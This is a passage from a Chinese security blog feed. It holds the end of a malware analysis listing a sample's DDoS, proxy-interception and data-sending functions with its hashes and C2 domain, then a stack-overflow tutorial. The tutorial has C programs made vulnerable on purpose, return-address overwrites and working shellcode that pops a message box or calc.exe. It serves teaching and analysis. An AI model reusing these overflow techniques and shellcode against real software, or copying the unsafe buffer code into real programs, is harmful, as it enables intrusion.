title="17"></a>17</h4><p>与上面一样，但是只会创建，不会执行，这里第三个参数是2</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/70.png"></p><p>这里不等于2才执行</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/71.png"></p><h4 id="18"><a href="#18" class="headerlink" title="18"></a>18</h4><p>会实现一个弹窗，窗口内容和标题都是接收到的数据</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/72.png"></p><h4 id="19"><a href="#19" class="headerlink" title="19"></a>19</h4><p>会下载DLL</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/73.png"></p><h4 id="20"><a href="#20" class="headerlink" title="20"></a>20</h4><p>DLLSerSt，根据名字不好猜测具体作用</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/74.png"></p><h4 id="21"><a href="#21" class="headerlink" title="21"></a>21</h4><p>DLLSerMa</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/75.png"></p><h4 id="22"><a href="#22" class="headerlink" title="22"></a>22</h4><p>DllReg应该是注册表相关</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/76.png"></p><h4 id="23"><a href="#23" class="headerlink" title="23"></a>23</h4><p>DllDdosOpen应该是打开DDOS功能</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/77.png"></p><h4 id="24"><a href="#24" class="headerlink" title="24"></a>24</h4><p>关闭DDOS功能</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/78.png"></p><h4 id="25"><a href="#25" class="headerlink" title="25"></a>25</h4><p>开启代理，应该会拦截获取所有的上网数据</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/79.png"></p><h4 id="26"><a href="#26" class="headerlink" title="26"></a>26</h4><p>关闭代理</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/80.png"></p><h4 id="27"><a href="#27" class="headerlink" title="27"></a>27</h4><p>查找指定的进程，找到后会加密发送一些信息给服务器。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/81.png"></p><p>进程遍历查找</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/82.png"></p><h4 id="28"><a href="#28" class="headerlink" title="28"></a>28</h4><p>查找指定窗口标题的程序，找到后会加密发送一些信息给服务器。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/83.png"></p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/84.png"></p><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><h3 id="MD5："><a href="#MD5：" class="headerlink" title="MD5："></a>MD5：</h3><ul><li>2f02e4a81dd4ff32270ed31429fd88d1（exe）</li><li>31802b90fe67a46bed5f3eb0ad6bb8c7（C2地址）</li></ul><h3 id="URL："><a href="#URL：" class="headerlink" title="URL："></a>URL：</h3><ul><li>hask.f3322.org</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;正好拿到了一个X绒的面试题，来分析一下看看。&lt;/p&gt;
&lt;h2 id=&quot;样本的信息&quot;&gt;&lt;a href=&quot;#样本的信息&quot; class=&quot;head</summary>
      
    
    
    
    <category term="病毒分析" scheme="https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出原理与实践</title>
    <link href="https://b1ackie.cn/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <id>https://b1ackie.cn/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</id>
    <published>2021-10-20T05:53:33.000Z</published>
    <updated>2021-10-26T07:33:04.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇笔记主要是《0day安全：软件漏洞分析技术》第一章第二篇的笔记，记录下栈溢出的原理和实践</p><h2 id="栈溢出原理与实践"><a href="#栈溢出原理与实践" class="headerlink" title="栈溢出原理与实践"></a>栈溢出原理与实践</h2><p>栈的相关概念就不再介绍了（其实是太懒了，不想再说了，主要搞逆向的对栈应该是非常熟悉了）。</p><h3 id="修改邻接变量"><a href="#修改邻接变量" class="headerlink" title="修改邻接变量"></a>修改邻接变量</h3><p>函数的局部变量在栈中是一个一个挨着排列的，如果在这些局部变量之中有数组之类的缓冲区，并且程序中存在着数组越界的缺陷，那么越界的数组元素就有可能破坏栈中的相邻变量的值，甚至破坏其中保存的EBP值、返回地址等重要数据。</p><p>如图，栈中保存着返回地址，成功覆盖且修改返回地址，指向其他地方就可以执行自己的代码。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/1.png"></p><p>现在编写一个简单的例子，来进行说明。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PASSWORD <span class="hljs-meta-string">&quot;1234567&quot;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *password)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iRet;<br><span class="hljs-keyword">char</span> buffer[<span class="hljs-number">8</span>];<br>iRet = <span class="hljs-built_in">strcmp</span>(password,PASSWORD);<br><span class="hljs-built_in">strcpy</span>(buffer,password);<br><span class="hljs-keyword">return</span> iRet;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iFlag=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> password[<span class="hljs-number">1024</span>];<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input password\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,password);<br>iFlag=a(password);<br><span class="hljs-keyword">if</span>(iFlag)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;right\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>只有输入正确的密码才会提示right</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/3.png"></p><p>从上述例子可以看到，我们需要输入密码，然后会调用a函数来进行比较，这是一个人为构造的栈溢出漏洞。</p><p>使用OD打开此程序进行调试查看，输入<code>7654321</code>当执行完<code>strcpy</code>函数之后，可以看到此时<code>ebp-4</code>存放的是<code>strcmp</code>的返回值，而上面就是buffer数组了。可以看到此时如果buffer数组的长度再长一些，就会成功覆盖到返回值。根据<code>    strcpy</code>函数返回值，我们只需要将保存<code>iRet</code>的地方覆盖为0即可。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/2.png"></p><p>现在尝试输入<code>123456789</code>查看栈内情况，可以看到9已经覆盖了原来的值1。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/4.png"></p><p>对于<code>123456789</code>这样一个字符串来说还存在隐藏的第十个字符，截断符<code>NULL</code>也占一个位，也就是如果我们想要成功覆盖返回值，只需要构造一个长度为8的字符串即可。但是必须要大于1234567，因为strcmp返回值如果是小于的话，返回值是-1，也就是FFFFFFFF，这样的话，是没有办法构造字符串成功覆盖的。</p><p>输入八个a，查看结果，可以看到本来应该是1的，现在是0。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/5.png"></p><p>利用栈溢出，成功绕过验证</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/6.png"></p><h3 id="修改函数返回地址"><a href="#修改函数返回地址" class="headerlink" title="修改函数返回地址"></a>修改函数返回地址</h3><p>前面修改了返回值，而在返回值下面不远处就是返回地址，如果我们可以修改返回地址就会造成更大的伤害。</p><p>尝试构造更加长的字符串，输入两串1-9，可以看到此时返回地址处已经被成功覆盖了。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/7.png"></p><p>现在只要想办法覆盖到返回地址，让那里的值刚好是另一个地址的值，那么在执行<code>retn</code>的时候就会跳到另一个地址去执行指令。我们现在想办法，让其返回的时候直接返回到成功的地方，就可以了。调试一下，可以看到当前输出正确的地址是<code>0x401106</code>，在返回值处填入此值，就会直接返回到正确处。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/8.png"></p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/9.png"></p><h3 id="控制程序的执行流程"><a href="#控制程序的执行流程" class="headerlink" title="控制程序的执行流程"></a>控制程序的执行流程</h3><p>一些十六进制值无法用键盘输入，所以将代码进行修改，使其读取文件内容来进行比较。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PASSWORD <span class="hljs-meta-string">&quot;1234567&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *password)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iRet;<br><span class="hljs-keyword">char</span> buffer[<span class="hljs-number">8</span>];<br>iRet = <span class="hljs-built_in">strcmp</span>(password,PASSWORD);<br><span class="hljs-built_in">strcpy</span>(buffer,password);<br><span class="hljs-keyword">return</span> iRet;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iFlag=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> password[<span class="hljs-number">1024</span>];<br>FILE * fp;<br><span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;rw+&quot;</span>)))<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">&quot;%s&quot;</span>,password);<br>iFlag = a(password);<br><span class="hljs-keyword">if</span>(iFlag)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;right\n&quot;</span>);<br>&#125;<br>fclose(fp);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在1.txt内写入如下内容，前两组<code>1234</code>是buffer数组，第三组覆盖iRet，第四组覆盖返回值上面的栈空间，第五组<code>40111F</code>就是输出right的地方，直接让其返回到这里，这样一直都会是正确。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/10.png"></p><p>打开程序就会直接提示正确，但是程序也提示了遇到了一些问题，这是因为栈空间被修改，退出时无法保持栈平衡，奔溃了。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/11.png"></p><h3 id="代码植入"><a href="#代码植入" class="headerlink" title="代码植入"></a>代码植入</h3><p>前面已经介绍了如何覆盖返回地址，前面是返回到程序自身的地址，如果我们构造自己的代码，然后让程序返回到我们自己写的代码处，就可以实现我们想要的功能。修改下之前写的代码，主要修改的地方是buffer的长度，还有<code>fscanf</code>修改为了<code>fread</code>，<code>strcpy</code>修改为了<code>memcpy</code>，主要是之前的函数遇到0就截止了，所以用这两个函数好了。加入LoadLibrary(“user32.dll”)，是为了后面shellcode中调用messagebox。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PASSWORD <span class="hljs-meta-string">&quot;1234567&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *password)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iRet;<br><span class="hljs-keyword">char</span> buffer[<span class="hljs-number">44</span>];<br>iRet = <span class="hljs-built_in">strcmp</span>(password,PASSWORD);<br><span class="hljs-built_in">memcpy</span>(buffer,password,<span class="hljs-number">100</span>);<br><span class="hljs-keyword">return</span> iRet;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> iFlag=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> password[<span class="hljs-number">1024</span>];<br>FILE * fp;<br>LoadLibrary(<span class="hljs-string">&quot;user32.dll&quot;</span>);<br><span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;rw+&quot;</span>)))<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>fread(password,<span class="hljs-number">1024</span>,<span class="hljs-number">1</span>,fp);<br>iFlag = a(password);<br><span class="hljs-keyword">if</span>(iFlag)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;right\n&quot;</span>);<br>&#125;<br>fclose(fp);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们实现一个弹窗的效果，调用<code>MessageBoxA</code></p><p>先来看一下shellcode，这是我的shellcode，书上是通过buffer的大小来保证足够的栈空间执行代码，我没有用书上的方法，我的buffer中存放就是刚好我的shellcode，我是用代码来开辟栈空间。</p><blockquote><p>sub esp,0x100</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br>__declspec(naked) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MAIN</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>__asm<br>&#123;<br>sub esp,<span class="hljs-number">0x100</span><span class="hljs-comment">//开辟栈空间</span><br>push <span class="hljs-number">0</span><br>push <span class="hljs-string">&#x27;eik&#x27;</span><br>push <span class="hljs-string">&#x27;ca1b&#x27;</span><br>mov eax ,esp<br>push <span class="hljs-number">0</span><br>push <span class="hljs-string">&#x27;tset&#x27;</span><br>mov ebx,esp<br>push <span class="hljs-number">0</span><br>push ebx<br>push eax<br>push <span class="hljs-number">0</span><br>mov eax,<span class="hljs-number">0x77D507EA</span><span class="hljs-comment">//MeeageBoxA的地址</span><br>call eax<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>首先先通过调试来确定这段代码的开头在哪里，可以看到是<code>12FAEC</code>，这个时候可以构建txt了。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/12.png"></p><p>还有就是代码中的MeeageBoxA的地址，可以通过工具<code>Dependency Walker</code>来确定，在当前使用的操作系统中，我的是XP，拖入一个调用了user32.dll的程序，也可以直接把user32.dll拿出来分析。</p><p>如图可以看到user32.dll的基地址是<code>77D10000</code>，而<code>MessageBoxA</code>在其中的偏移是<code>407EA</code>，相加就是<code>77D507EA</code>，这就是<code>MessageBoxA</code>的地址。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/16.png"></p><p>将shellcode写入，并且将执行shellcode的起始位置写入末尾，来覆盖返回地址。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/13.png"></p><p>执行<code>retn</code>之后，可以看到成功来到了shellcode处。</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/14.png"></p><p>实现了弹窗</p><p><img src="/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/15.png"></p><p>也可以在shellcode中实现所有的函数动态加载</p><p>在这里，写了一些shellcode的东西<a href="https://b1ackie.cn/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/">shellcode学习</a></p><p>根据这些可以写一个弹计算器的，来进行实现。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span></span>;<br>FARPROC _GetProcAddress(HMODULE hModule);<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">UINT</span> <span class="hljs-params">(WINAPI* FN_WinExec)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpCmdLine,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT uCmdShow)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MAIN</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>sub esp,<span class="hljs-number">0x1000</span><br>&#125;<br>HMODULE hAddr = (HMODULE)getKernel32();<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* FN_GetProcAddress)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br>FN_GetProcAddress fn_GetProcAddress;<br>fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* FN_LoadLibraryA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpLibFileName)</span></span>;<br><span class="hljs-keyword">char</span> szLoadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress(hAddr, szLoadLibraryA);<br><span class="hljs-keyword">char</span> szWinexec[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span> ,<span class="hljs-string">&#x27;E&#x27;</span> ,<span class="hljs-string">&#x27;x&#x27;</span> ,<span class="hljs-string">&#x27;e&#x27;</span> ,<span class="hljs-string">&#x27;c&#x27;</span> ,<span class="hljs-number">0</span> &#125;;<br>FN_WinExec my_WinExec = (FN_WinExec)fn_GetProcAddress(hAddr, szWinexec);<br><span class="hljs-keyword">char</span> szCalc[] = &#123; <span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span> ,<span class="hljs-string">&#x27;l&#x27;</span> ,<span class="hljs-string">&#x27;c&#x27;</span> ,<span class="hljs-string">&#x27;.&#x27;</span> ,<span class="hljs-string">&#x27;e&#x27;</span> ,<span class="hljs-string">&#x27;x&#x27;</span> ,<span class="hljs-string">&#x27;e&#x27;</span> ,<span class="hljs-number">0</span> &#125;;<br>my_WinExec(szCalc, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>_declspec(naked) <span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>mov eax, fs: [<span class="hljs-number">30</span>h]<span class="hljs-comment">//获取PEB</span><br>mov eax, [eax + <span class="hljs-number">0</span>Ch]<span class="hljs-comment">//获取_PEB_LDR_DATA</span><br>mov eax, [eax + <span class="hljs-number">14</span>h]<span class="hljs-comment">//InMemoryOrderModuleList，</span><br>mov eax, [eax]<span class="hljs-comment">//程序自身</span><br>mov eax, [eax]<span class="hljs-comment">//ntdll.dll</span><br>mov eax, [eax + <span class="hljs-number">10</span>h]<span 